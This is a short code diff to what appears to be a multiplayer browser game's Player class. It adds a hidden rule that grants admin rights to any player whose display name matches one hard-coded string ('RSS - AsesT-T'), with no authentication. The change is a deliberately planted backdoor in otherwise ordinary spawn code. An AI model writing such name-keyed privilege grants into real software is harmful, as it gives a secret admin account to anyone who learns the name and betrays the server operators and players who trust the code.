@@ -74,6 +74,9 @@ export class Player {
         this.pingCooldown = 0;
 
         // SPAWN:
+        if (this.name === "RSS - AsesT-T") {
+    this.isAdmin = true;
+}
         this.spawn = function (moofoll) {
             this.active = true;
             this.alive = true;
